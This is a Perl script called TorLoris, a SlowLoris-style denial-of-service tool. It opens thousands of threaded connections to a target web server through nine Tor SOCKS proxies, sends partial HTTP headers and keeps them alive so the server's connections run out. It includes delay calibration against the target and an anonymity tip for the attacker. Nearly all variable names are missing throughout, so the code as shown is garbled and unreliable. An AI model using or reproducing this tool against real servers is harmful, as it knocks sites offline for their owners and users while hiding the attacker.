#!/bin/perl

##################TorLoris######################
# Based on the SlowLoris tool by Robert "RSnake" Hansen
# http://ha.ckers.org/slowloris/
######################

###########################Setup###########################
#Use the the strict package because...
use strict;
#Include the socket functions of PERL
use IO::Socket;
use IO::Socket::Socks;	
#Include threading package
use threads;
#Ignore sigs
{'PIPE'} = 'IGNORE'; 
######################END OF SETUP###########################

# Server info and port info. 
    my  = shift || "127.0.0.1"; #Server IP address, using a URL may cause information leakage as the DNS query won't go through the socks proxy. 
    my  = "80"; #Port of web server to attack
    my ; #A variable to hold a timer
    my  = 50; #The amount of loops per thread/
    my  = 10000; #The total number of connections
    my  = 5; #Timeout value for the socks socket
    my ; #Variable to a working/notworking thing
    my @timervalues = ( "2", "30", "90", "240", "500"); #Various values to be used when making connectons
    my @proxyaddress = ( "127.0.0.1", "127.0.0.1", "127.0.0.1", "127.0.0.1", "127.0.0.1", "127.0.0.1", "127.0.0.1", "127.0.0.1", "127.0.0.1" ); #The address of the proxy. 
    my @proxyportnums = ( "9051", "9052", "9053", "9054", "9055", "9056", "9057", "9058", "9059");
    my @socksver = ( "5", "5", "5", "5", "5", "5", "5", "5", "5" ); #Socks Version
# End of server info and port info.

#Randomize the first proxy to use for testing :)
my  = int( rand(9));

#Create connection to test delay
if (my  = IO::Socket::Socks->new(ProxyAddr => [],
                    ProxyPort => [],
                    ConnectAddr => ,
                    ConnectPort => ,
                    SocksVersion => [],
                    Timeout => ) or die  ) {

    ##If the connection works wee generate a http header with some junk as a get but miss the last new line and carridge return chars
    my  =" GET / " . int( rand(99999999999999) ) . " HTTP/1.1\r\n Host: \r\n User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\nContent-Length: 42\r\n\ ";
    
    ##If we can send the header down the sock we created earlier
    if (print  ) {
        #Print a success message
        print "Successfull data send\r\n";
    } else {
        #print and unsuccessful massage
        print "unsuccessful data send, exiting\r\n";
        exit;
    }
    
    #Yes it does work
     = 1;

    #Timeout Calc function :)
    for (my  = 0;  <= $#timervalues; ++) {
        #Print status message
        print "Testing [] second delay\r\n";
        
        #Sleep for the timer values
        sleep([]);
        
        #send an update to the webserver to test delay
        if ( print  "X-a: b\r\n" ) {
            #If it works, then the timeout can be this or less
            print "This timer worked\r\n";
            #Update the sleeptimer variable to contain the successful timer
             = [];
        } else {
            #if it doesn't work
            if ( {__WARN__} ) {
                    #We fail it
                    print "Failed timeout test at [] :(\r\n";
                    #and the timer = the previous value
                     = [ -1];

            }

            last;
        }
                
    }
    
    print "Will connect to  on port  every with a  timer on each socket\r\n";
    
} else {
    
    #no it doesn't work
     = 0;
    
    #lol
    print "FAILED\r\n";
    
}

#if the inital connection works
if ( == 1) {

    #define some vars
    my @threads;
    
    my ;
    
    my  = 0;
    
    my ;
    
    my ;
    
    my  = 1;
    
    #while < the total number of connections
    while ( < ) {
        
        #What tor instance is used?
        if ( == 0) {
                 =1;
                 = 1;
        } elsif ( == 1) {
                 =2;
                 = 2;
        } elsif ( == 2) {
                 =3;
                 = 3;
        } elsif ( == 3) {
                 =4;
                 = 4;
        } elsif ( == 4) {
                 =5;
                 = 5;
        } elsif ( == 5) {
                 =6;
                 = 6;
        } elsif ( == 6) {
                 =7;
                 = 7;
        } elsif ( == 7) {
                 =8;
                 = 8;
        } elsif ( == 8) {
                 =0;
                 = 0;
        }
                
        #create a new thread for a connection loop that has all the relevent information
        [] = threads->create(\&connectionsub, , , ,, 'tcp', , [], [], [],  );
        #Thread online :)
        print "Thread  ONLINE\r\n";
        #Add the threadcon value to the inum counter
         =  + ;
         ++;
        
    }
    
    #Get all the threads into an array
    my @letussee = threads->list;
        #While the number of threads is greater than 0
    while ($#letussee > 0) {
        
    }
    print "Threads all dead :( \r\n";
    
} else {
    
    #no it doesn't work :(
    print "Does not work\r\n";
    
}

#Connection sub for doing the business
sub connectionsub {
    #define a bunch of vars
    my (, , , , , , , , , ) = @_;
    my @threadsock;
    my @threadworking;
    my @threadsock;
    my ;

    #while always
    while (1) {
        
        print "Thread  Working\r\n";
                
        #For each xnum in the total connections per thread
        for  (1 .. ) {
            #Generate a sock (and an if conditional)
            if ([] = new IO::Socket::Socks( ProxyAddr => ,
                                        ProxyPort => ,
                                        ConnectAddr => ,
                                        ConnectPort => ,
                                        SocksVersion => ,
                                        Timeout =>  ))
            {
                #Generate a request header
                my  = " GET / " . int( rand(99999999999999) ) . " HTTP/1.1\r\n Host: \r\n User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\nContent-Length: 42\r\n\ ";
                
                #Put the sock in a filehandle
                my  = [];
                
                [] = 1;
                
                #If the connection works
                if () {
                    
                    #See what happens
                    print  "";
                        if ( {__WARN__} ) {
                            [] = 0;
                            close ;
                        } else {
                            
                            [] = 1;
                            
                        }
                        
                }
                
            } else {
                
                [] = 0;
            }
        
        }
        
        for my  (1 .. ) {
            if ([] == 1) {
                if ([]) {
                    
                    my  = [];
                    
                    if (print  "X-a: b\r\n") {
                        
                        [] = 1;
                        
                    } else {
                        
                        [] = 0;
                        
                    }
                        
                } else {
                    
                    [] - 0;
                    
                }
            }
            
        }
        
        sleep();
        
    }
    
}